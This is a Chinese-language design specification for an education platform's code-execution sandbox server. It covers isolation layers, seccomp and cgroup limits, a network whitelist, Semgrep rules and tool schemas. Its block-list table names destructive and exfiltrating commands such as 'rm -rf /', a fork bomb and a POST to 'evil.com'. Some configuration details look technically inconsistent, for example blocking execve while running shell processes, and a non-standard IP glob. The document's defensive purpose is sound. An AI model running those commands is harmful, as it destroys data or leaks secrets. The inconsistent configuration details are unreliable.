# ohb-sandbox MCP Server 规格文档

> **文档定位**：定义 OneHumanBusiness 平台安全代码执行环境的 MCP Server 完整规格，包含沙箱安全架构、资源限制、文件系统隔离、网络白名单及禁止操作清单。
>
> **关联文档**：`01-MCP架构总览.md`、`05-ohb-ethos-server-spec.md`
>
> **最后更新**：2026-05-17

---

## 一、概述

`ohb-sandbox` 是 OHB 平台最关键的安全基础设施之一，为 AI 员工（尤其是 DEV 类开发角色）提供受控的代码执行环境。AI 员工生成的代码在此环境中运行、测试和验证，确保学生在不暴露本地环境风险的前提下，获得即时的代码执行反馈。

**核心安全目标**：
1. **零信任执行**：所有代码默认不可信，必须在隔离环境中运行
2. **最小权限**：代码只拥有完成任务所需的最小系统权限
3. **资源可控**：CPU、内存、网络和执行时间均有硬上限
4. **数据隔离**：学生代码无法访问其他学生的数据或系统敏感信息
5. **可观测**：所有执行行为被记录和审计

---

## 二、沙箱安全架构

### 2.1 架构层级

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           Host OS (Linux)                                    │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │                    Docker Container (ohb-sandbox)                    │   │
│  │  ┌─────────────────────────────────────────────────────────────┐   │   │
│  │  │              gVisor / Firecracker MicroVM                    │   │   │
│  │  │  ┌─────────────────────────────────────────────────────┐   │   │   │
│  │  │  │              Guest OS (轻量级Linux)                  │   │   │   │
│  │  │  │  ┌─────────────────────────────────────────────┐   │   │   │   │
│  │  │  │  │         受限进程空间 (学生代码执行)            │   │   │   │   │
│  │  │  │  │                                              │   │   │   │   │
│  │  │  │  │  ┌─────────┐  ┌─────────┐  ┌─────────┐   │   │   │   │   │
│  │  │  │  │  │  Python │  │ Node.js │  │  Shell  │   │   │   │   │   │
│  │  │  │  │  │ 进程    │  │ 进程    │  │ 进程    │   │   │   │   │   │
│  │  │  │  │  └─────────┘  └─────────┘  └─────────┘   │   │   │   │   │
│  │  │  │  │                                              │   │   │   │   │
│  │  │  │  │  文件系统: tmpfs (内存文件系统)              │   │   │   │   │
│  │  │  │  │  网络: 受限白名单                            │   │   │   │   │
│  │  │  │  │  系统调用: seccomp-bpf 过滤                  │   │   │   │   │
│  │  │  │  └─────────────────────────────────────────────┘   │   │   │   │
│  │  │  └─────────────────────────────────────────────────────┘   │   │   │
│  │  └─────────────────────────────────────────────────────────────┘   │   │
│  │                                                                    │   │
│  │  监控代理: 资源使用、系统调用拦截、日志收集                          │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 2.2 隔离技术选型

| 层级 | 技术方案 | 隔离粒度 | 启动时间 | 适用场景 |
|------|----------|----------|----------|----------|
| 容器 | Docker | 进程级 | <1s | 资源管理、镜像分发 |
| 轻量VM | Firecracker | 虚拟化级 | <125ms | 短任务、高并发 |
| 用户空间内核 | gVisor | 系统调用拦截 | <500ms | 长任务、深度隔离 |

**最终方案**：
- **默认模式**：Docker + gVisor (`runsc` runtime)，平衡安全性与启动速度
- **高安全模式**：Firecracker MicroVM，用于执行不可信或高风险代码
- **快速模式**：纯 Docker（无VM），用于信任的模板代码快速验证

### 2.3 seccomp-bpf 系统调用过滤

```yaml
seccomp_policy:
  default_action: "SCMP_ACT_ERRNO"
  allowed_syscalls:
    # 文件操作（仅限临时目录）
    - read, write, openat, close, lseek, pread64, pwrite64
    - stat, fstat, lstat, access, faccessat
    # 进程管理
    - exit, exit_group, brk, mmap, munmap, mprotect
    - clone, wait4, waitpid
    # 时间管理
    - clock_gettime, gettimeofday, nanosleep
    # 网络（需进一步限制connect目标）
    - socket, connect, recvfrom, sendto, recvmsg, sendmsg
    - getaddrinfo, getnameinfo
  
  blocked_syscalls:
    # 禁止的系统调用
    - execve, execveat          # 禁止执行新程序
    - ptrace                    # 禁止调试其他进程
    - mount, umount2            # 禁止挂载文件系统
    - chroot, pivot_root        # 禁止修改根目录
    - setuid, setgid, setgroups # 禁止修改权限
    - reboot, kexec_load        # 禁止系统级操作
    - open_by_handle_at         # 禁止绕过路径访问
```

---

## 三、资源限制

### 3.1 资源配额模型

```yaml
resource_quotas:
  # 默认配额（L1-L2 学生）
  default:
    cpu_cores: 0.5              # 半核 CPU
    memory_mb: 512              # 512MB 内存
    disk_mb: 100                # 100MB 临时磁盘
    execution_time_seconds: 30  # 30秒执行时间
    network: "whitelist_only"   # 仅白名单域名
    max_processes: 10           # 最大进程数
    max_open_files: 64          # 最大打开文件数
  
  # 升级配额（L3-L5 学生）
  advanced:
    cpu_cores: 1.0
    memory_mb: 1024
    disk_mb: 500
    execution_time_seconds: 120
    network: "whitelist_only"
    max_processes: 25
    max_open_files: 128
  
  # 特殊任务配额（需审批）
  special:
    cpu_cores: 2.0
    memory_mb: 2048
    disk_mb: 1000
    execution_time_seconds: 300
    network: "whitelist_plus_npm"
    max_processes: 50
    max_open_files: 256
```

### 3.2 cgroup v2 配置

```bash
# 创建 cgroup 并设置资源限制
mkdir -p /sys/fs/cgroup/ohb-sandbox/student_abc123

echo "500000 1000000" > /sys/fs/cgroup/ohb-sandbox/student_abc123/cpu.max
echo "536870912" > /sys/fs/cgroup/ohb-sandbox/student_abc123/memory.max
echo "104857600" > /sys/fs/cgroup/ohb-sandbox/student_abc123/memory.swap.max
echo "10" > /sys/fs/cgroup/ohb-sandbox/student_abc123/pids.max
```

---

## 四、文件系统隔离

### 4.1 文件系统架构

```
Guest OS 文件系统:
/
├── bin/          # 只读: 基础命令 (ls, cat, python, node)
├── lib/          # 只读: 系统库
├── usr/          # 只读: 用户级程序
├── etc/          # 只读: 配置文件（去除敏感信息）
├── tmp/          # 读写: 临时工作目录（tmpfs，重启清空）
│   └── workspace/  # 学生代码执行的工作目录
│       ├── src/    # 学生提交的源代码
│       ├── node_modules/  # 安装的依赖（沙箱内）
│       └── output/ # 执行输出
├── home/sandbox/ # 读写: 学生主目录（空，无历史数据）
└── proc/         # 只读: 限制视图的 procfs
    └── （隐藏其他进程信息，仅可见自身）
```

### 4.2 基础镜像内容

```dockerfile
FROM python:3.11-slim-bookworm AS ohb-sandbox-base

# 安装 Node.js（用于前端代码执行）
RUN apt-get update && apt-get install -y --no-install-recommends \
    nodejs npm \
    && rm -rf /var/lib/apt/lists/*

# 预装常用Python包（减少安装时间）
RUN pip install --no-cache-dir \
    numpy pandas matplotlib requests beautifulsoup4 \
    pytest flake8 black

# 预装常用Node包
RUN npm install -g eslint prettier jest

# 创建 sandbox 用户（非root）
RUN useradd -m -s /bin/bash sandbox
USER sandbox
WORKDIR /tmp/workspace

# 清理敏感环境变量
ENV PATH=/usr/local/bin:/usr/bin:/bin
ENV HOME=/home/sandbox
```

---

## 五、网络白名单

### 5.1 域名白名单

```yaml
network_whitelist:
  # 开发资源
  allowed_domains:
    - "registry.npmjs.org"       # npm 包注册表
    - "pypi.org"                 # PyPI
    - "files.pythonhosted.org"   # Python 包下载
    - "github.com"               # GitHub API（只读）
    - "raw.githubusercontent.com" # GitHub 原始文件
    - "api.github.com"           # GitHub API
    - "cdn.jsdelivr.net"         # CDN
    - "unpkg.com"                # npm CDN
    - "fonts.googleapis.com"     # Google Fonts
    
  # OHB 平台内部
  internal_domains:
    - "api.ohb.edu.local"        # OHB 内部API
    - "atlas.ohb.edu.local"      # 知识图谱服务
    - "memory.ohb.edu.local"     # 记忆服务
    
  # 外部API（需额外审批）
  conditional_domains:
    - "api.openai.com"           # OpenAI API
    - "api.anthropic.com"        # Anthropic API
    - "api.stripe.com"           # Stripe（测试模式）
    
  blocked_patterns:
    - "*localhost*"
    - "*127.0.0.1*"
    - "*0.0.0.0*"
    - "*169.254.*"               # 链路本地地址
    - "*10.*.*.*"                # 私有A类
    - "*172.16-31.*.*"           # 私有B类
    - "*192.168.*.*"             # 私有C类
```

### 5.2 网络层实现

使用 iptables/nftables 在容器级别实施出站过滤：

```bash
# 默认拒绝所有出站连接
nft add rule inet filter output drop

# 允许DNS解析
nft add rule inet filter output ip daddr 8.8.8.8 udp dport 53 accept

# 允许白名单域名（通过DNS解析后动态添加IP规则）
for domain in registry.npmjs.org pypi.org; do
    ip=$(dig +short $domain | head -1)
    nft add rule inet filter output ip daddr $ip accept
done
```

---

## 六、禁止操作清单

### 6.1 代码级禁止模式

以下代码模式在提交前即被静态扫描拦截：

| 类别 | 禁止模式 | 风险 | 拦截方式 |
|------|----------|------|----------|
| 文件删除 | `os.system("rm -rf /")`, `shutil.rmtree("/")` | 破坏文件系统 | 静态扫描 |
| 系统命令 | `subprocess.run("shutdown")`, `os.execve` | 执行系统命令 | 静态扫描 + seccomp |
| 网络扫描 | `nmap`, `socket.scan`, 大量 connect | 端口扫描 | 运行时行为检测 |
| 数据外泄 | `requests.post("evil.com", data=...)` | 窃取数据 | 网络白名单拦截 |
| 资源耗尽 | `while True: fork()`, 无限递归 | DoS攻击 | cgroup限制 + 超时 |
| 环境变量 | `os.environ`, `process.env` | 读取敏感配置 | 环境变量清空 + 静态扫描 |
| 加密挖矿 | `crypto`, `hashlib` 异常高频调用 | 恶意挖矿 | CPU使用率监控 |
| 反调试 | `ptrace` 调用检测 | 逃逸沙箱 | seccomp拦截 |

### 6.2 静态扫描规则（Semgrep 示例）

```yaml
# ohb-sandbox-security-rules.yml
rules:
  - id: dangerous-system-call
    pattern-either:
      - pattern: os.system(...)
      - pattern: subprocess.call(...)
      - pattern: subprocess.run(..., shell=True, ...)
    message: "禁止直接执行系统命令"
    severity: ERROR
    languages: [python]

  - id: file-deletion-risk
    pattern-either:
      - pattern: os.remove("/")
      - pattern: shutil.rmtree("/")
    message: "禁止删除系统文件"
    severity: ERROR
    languages: [python]

  - id: network-exfiltration
    pattern: requests.post($URL, ...)
    condition: not $URL in ALLOWED_DOMAINS
    message: "禁止向未授权域名发送数据"
    severity: ERROR
    languages: [python]
```

---

## 七、Tools 定义

### 7.1 execute_code — 执行代码

在沙箱中执行 Python、Node.js 或 Shell 代码。

#### 输入 Schema

```json
{
  "$schema": "http://json-schema.org/draft-07/schema#",
  "type": "object",
  "title": "execute_code_input",
  "required": ["code", "language"],
  "properties": {
    "code": {
      "type": "string",
      "description": "要执行的源代码",
      "minLength": 1,
      "maxLength": 50000
    },
    "language": {
      "type": "string",
      "enum": ["python", "javascript", "typescript", "shell", "html"],
      "description": "编程语言"
    },
    "inputs": {
      "type": "array",
      "description": "标准输入数据（逐行）",
      "items": { "type": "string" },
      "default": []
    },
    "files": {
      "type": "array",
      "description": "需要写入沙箱的附加文件",
      "items": {
        "type": "object",
        "required": ["filename", "content"],
        "properties": {
          "filename": { "type": "string", "pattern": "^[a-zA-Z0-9_.\-/]+$" },
          "content": { "type": "string" },
          "encoding": { "type": "string", "enum": ["utf-8", "base64"], "default": "utf-8" }
        }
      },
      "default": []
    },
    "timeout_seconds": {
      "type": "integer",
      "description": "执行超时（秒），超过配额则使用配额值",
      "minimum": 1,
      "maximum": 300,
      "default": 30
    },
    "expected_output": {
      "type": "string",
      "description": "期望输出（用于自动判定）",
      "nullable": true
    }
  }
}
```

#### 输出 Schema

```json
{
  "$schema": "http://json-schema.org/draft-07/schema#",
  "type": "object",
  "title": "execute_code_output",
  "required": ["status", "stdout", "stderr", "exit_code"],
  "properties": {
    "status": {
      "type": "string",
      "enum": ["success", "error", "timeout", "killed", "security_violation"]
    },
    "stdout": { "type": "string", "description": "标准输出" },
    "stderr": { "type": "string", "description": "标准错误" },
    "exit_code": { "type": "integer" },
    "execution_time_ms": { "type": "integer" },
    "resource_usage": {
      "type": "object",
      "properties": {
        "cpu_time_ms": { "type": "integer" },
        "memory_peak_mb": { "type": "number" },
        "disk_read_mb": { "type": "number" },
        "disk_write_mb": { "type": "number" },
        "network_requests": { "type": "integer" }
      }
    },
    "security_scan": {
      "type": "object",
      "properties": {
        "passed": { "type": "boolean" },
        "violations": {
          "type": "array",
          "items": {
            "type": "object",
            "properties": {
              "rule_id": { "type": "string" },
              "severity": { "type": "string", "enum": ["INFO", "WARNING", "ERROR"] },
              "message": { "type": "string" },
              "line": { "type": "integer" }
            }
          }
        }
      }
    },
    "output_files": {
      "type": "array",
      "description": "沙箱中生成的输出文件",
      "items": {
        "type": "object",
        "properties": {
          "filename": { "type": "string" },
          "size_bytes": { "type": "integer" },
          "content": { "type": "string", "description": "文本内容（仅小文件）" },
          "download_url": { "type": "string", "description": "大文件下载链接" }
        }
      }
    }
  }
}
```

---

### 7.2 run_tests — 运行测试

在沙箱中执行测试套件（pytest、jest 等）。

#### 输入 Schema

```json
{
  "$schema": "http://json-schema.org/draft-07/schema#",
  "type": "object",
  "title": "run_tests_input",
  "required": ["test_framework", "files"],
  "properties": {
    "test_framework": {
      "type": "string",
      "enum": ["pytest", "jest", "mocha", "unittest"],
      "description": "测试框架"
    },
    "files": {
      "type": "array",
      "description": "测试文件和源代码文件",
      "items": {
        "type": "object",
        "required": ["filename", "content"],
        "properties": {
          "filename": { "type": "string" },
          "content": { "type": "string" },
          "is_test_file": { "type": "boolean", "default": false }
        }
      }
    },
    "timeout_seconds": {
      "type": "integer",
      "default": 60,
      "maximum": 300
    },
    "coverage": {
      "type": "boolean",
      "default": false,
      "description": "是否生成覆盖率报告"
    }
  }
}
```

#### 输出 Schema

```json
{
  "$schema": "http://json-schema.org/draft-07/schema#",
  "type": "object",
  "title": "run_tests_output",
  "required": ["status", "summary"],
  "properties": {
    "status": { "type": "string", "enum": ["passed", "failed", "error", "timeout"] },
    "summary": {
      "type": "object",
      "properties": {
        "total": { "type": "integer" },
        "passed": { "type": "integer" },
        "failed": { "type": "integer" },
        "skipped": { "type": "integer" }
      }
    },
    "test_cases": {
      "type": "array",
      "items": {
        "type": "object",
        "properties": {
          "name": { "type": "string" },
          "status": { "type": "string", "enum": ["passed", "failed", "skipped", "error"] },
          "duration_ms": { "type": "integer" },
          "error_message": { "type": "string", "nullable": true },
          "stack_trace": { "type": "string", "nullable": true }
        }
      }
    },
    "coverage_report": {
      "type": "object",
      "nullable": true,
      "properties": {
        "line_coverage": { "type": "number" },
        "branch_coverage": { "type": "number" }
      }
    }
  }
}
```

---

### 7.3 lint_check — 代码检查

对代码进行静态分析和风格检查。

#### 输入 Schema

```json
{
  "$schema": "http://json-schema.org/draft-07/schema#",
  "type": "object",
  "title": "lint_check_input",
  "required": ["code", "language"],
  "properties": {
    "code": { "type": "string", "description": "源代码" },
    "language": {
      "type": "string",
      "enum": ["python", "javascript", "typescript"]
    },
    "linter": {
      "type": "string",
      "enum": ["flake8", "pylint", "eslint", "default"],
      "default": "default"
    },
    "rules": {
      "type": "array",
      "description": "自定义规则覆盖",
      "items": { "type": "string" },
      "default": []
    }
  }
}
```

#### 输出 Schema

```json
{
  "$schema": "http://json-schema.org/draft-07/schema#",
  "type": "object",
  "title": "lint_check_output",
  "required": ["issues"],
  "properties": {
    "issues": {
      "type": "array",
      "items": {
        "type": "object",
        "properties": {
          "severity": { "type": "string", "enum": ["error", "warning", "info"] },
          "line": { "type": "integer" },
          "column": { "type": "integer" },
          "message": { "type": "string" },
          "rule_id": { "type": "string" },
          "suggestion": { "type": "string", "nullable": true }
        }
      }
    },
    "score": { "type": "integer", "description": "代码质量评分 (0-100)" }
  }
}
```

---

### 7.4 deploy_preview — 生成预览部署

将前端代码打包并生成可预览的临时URL。

#### 输入 Schema

```json
{
  "$schema": "http://json-schema.org/draft-07/schema#",
  "type": "object",
  "title": "deploy_preview_input",
  "required": ["files"],
  "properties": {
    "files": {
      "type": "array",
      "description": "前端项目文件列表",
      "items": {
        "type": "object",
        "required": ["path", "content"],
        "properties": {
          "path": { "type": "string" },
          "content": { "type": "string" },
          "encoding": { "type": "string", "enum": ["utf-8", "base64"], "default": "utf-8" }
        }
      }
    },
    "framework": {
      "type": "string",
      "enum": ["vanilla", "react", "vue", "static"],
      "default": "static"
    },
    "ttl_minutes": {
      "type": "integer",
      "description": "预览链接有效期",
      "minimum": 5,
      "maximum": 1440,
      "default": 60
    }
  }
}
```

#### 输出 Schema

```json
{
  "$schema": "http://json-schema.org/draft-07/schema#",
  "type": "object",
  "title": "deploy_preview_output",
  "required": ["preview_url", "expires_at"],
  "properties": {
    "preview_url": { "type": "string", "format": "uri" },
    "expires_at": { "type": "string", "format": "date-time" },
    "deployment_id": { "type": "string" },
    "build_log": { "type": "string", "description": "构建日志" }
  }
}
```

---

### 7.5 package_install — 安装依赖

在沙箱中安装 Python 或 Node.js 依赖包。

#### 输入 Schema

```json
{
  "$schema": "http://json-schema.org/draft-07/schema#",
  "type": "object",
  "title": "package_install_input",
  "required": ["packages", "language"],
  "properties": {
    "packages": {
      "type": "array",
      "description": "要安装的包名列表",
      "items": { "type": "string" },
      "minItems": 1
    },
    "language": {
      "type": "string",
      "enum": ["python", "javascript"]
    },
    "version_specs": {
      "type": "object",
      "description": "版本指定",
      "additionalProperties": { "type": "string" }
    }
  }
}
```

#### 输出 Schema

```json
{
  "$schema": "http://json-schema.org/draft-07/schema#",
  "type": "object",
  "title": "package_install_output",
  "required": ["installed", "failed"],
  "properties": {
    "installed": {
      "type": "array",
      "items": {
        "type": "object",
        "properties": {
          "package": { "type": "string" },
          "version": { "type": "string" }
        }
      }
    },
    "failed": {
      "type": "array",
      "items": {
        "type": "object",
        "properties": {
          "package": { "type": "string" },
          "error": { "type": "string" }
        }
      }
    },
    "install_time_ms": { "type": "integer" }
  }
}
```

---

## 八、错误码汇总

| 错误码 | 名称 | 描述 |
|--------|------|------|
| `SBOX-0000` | `SUCCESS` | 执行成功 |
| `SBOX-1001` | `SECURITY_VIOLATION` | 代码违反安全策略 |
| `SBOX-1002` | `TIMEOUT` | 执行超时 |
| `SBOX-1003` | `MEMORY_LIMIT` | 内存超限 |
| `SBOX-1004` | `CPU_LIMIT` | CPU时间超限 |
| `SBOX-1005` | `DISK_LIMIT` | 磁盘空间不足 |
| `SBOX-1006` | `NETWORK_BLOCKED` | 网络请求被拦截 |
| `SBOX-1007` | `FORBIDDEN_SYSCALL` | 禁止的系统调用 |
| `SBOX-2001` | `LANGUAGE_UNSUPPORTED` | 不支持的编程语言 |
| `SBOX-2002` | `PACKAGE_NOT_FOUND` | 依赖包不存在 |
| `SBOX-2003` | `BUILD_FAILED` | 预览部署构建失败 |
| `SBOX-5001` | `INTERNAL_ERROR` | 沙箱内部错误 |

---

## 九、附录

### 9.1 环境变量配置

| 变量名 | 默认值 | 说明 |
|--------|--------|------|
| `OHB_SANDBOX_RUNTIME` | `gvisor` | 沙箱运行时 (gvisor / firecracker / docker) |
| `OHB_SANDBOX_IMAGE` | `ohb-sandbox-base:latest` | 基础镜像 |
| `OHB_SANDBOX_MAX_CONCURRENT` | `20` | 最大并发沙箱数 |
| `OHB_SANDBOX_PORT` | `8083` | MCP Server 端口 |

### 9.2 变更日志

| 版本 | 日期 | 变更内容 |
|------|------|----------|
| v0.1 | 2026-05-17 | 初稿，定义5个tools及完整安全架构 |
